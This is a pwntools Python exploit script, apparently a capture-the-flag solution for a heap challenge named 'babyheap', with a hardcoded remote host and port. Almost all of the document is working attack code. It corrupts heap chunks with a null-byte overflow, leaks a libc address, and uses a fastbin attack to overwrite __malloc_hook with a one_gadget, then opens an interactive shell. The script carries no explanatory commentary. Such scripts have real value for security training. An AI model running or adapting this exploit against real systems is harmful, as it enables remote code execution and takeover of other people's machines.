#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


BINARY = './babyheap'
ARGS = ""
LIBC = './libc.so.6'
HOST = '35.186.153.116'
PORT = 7001

elf = ELF(BINARY)
#libc = ELF('./libc.so.6')

context.terminal = ['tmux', 'split-w']

#printf = elf.got['printf']             

def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
        if not args.REMOTE:
                print("LOCAL PROCESS")
                return process([BINARY, ARGS], env={"LD_PRELOAD":LIBC})
        else:
                print("REMOTE PROCESS")
                return remote(HOST, PORT)


def malloc(size, data):
        p.sendlineafter("> ", "1")
        p.sendlineafter("size: ", str(size))
        p.sendafter("data: ", data)

def free(idx):
        p.sendlineafter("> ", "2")
        p.sendlineafter("idx: ", str(idx))

def show(idx):
        p.sendlineafter("> ", "3")
        p.sendlineafter("idx: ", str(idx))
        p.recvuntil('data: ')

# 00100c74
p = start()
if args.GDB:
    gdb.attach(p, "b")# free")


malloc(0x108, 'a' * 0x107) # 0
malloc(0x158, 'b' * 0x151) # 1
malloc(0x68, 'c' * 0x61) # 2
malloc(0x18, 'd' ) # 3
malloc(0x1f8, 'a' * 0x1f7) # 4
malloc(0x68, 'q' * 0x61) # 5

free(0)
free(3)

malloc(0x18, 'A' * 0x18) # 0 replaced what was at idx 3

for i in range(0, 6):
        free(0)
        malloc(0x18, '\x03' * (0x17 - i))
for i in range(7, 9):
        free(0) # 0
        malloc(0x18, 'B' * (0x17 - i))

free(4)

malloc(0x108, '0' * 0x107) # index 3

show(1)

leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak - 0x3c4b78
log.info("leak: {}".format(hex(libc_base)))

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
malloc_hook = libc_base + 0x3c4b10
log.info("malloc_hook: {}".format(hex(malloc_hook)))
one_gadget = libc_base + one_gadgets[3]

malloc(0x158, 'X' * 0x151)# index 1
malloc(0x68, 'W' * 0x61) # index 2
malloc(0x218, 'Z' * 0x211) # index 0

free(2)
free(5)
free(6)

gad = p64(malloc_hook - 0x23)
gad = gad.ljust(0x61, b'z')
malloc(0x68, gad)

malloc(0x68, 'A' * 0x61)
malloc(0x68, 'B' * 0x61)

exploit = b'a' * 0x13
exploit += p64(one_gadget)
exploit = exploit.ljust(0x61, b'\x00')

malloc(0x68, exploit)


p.interactive()
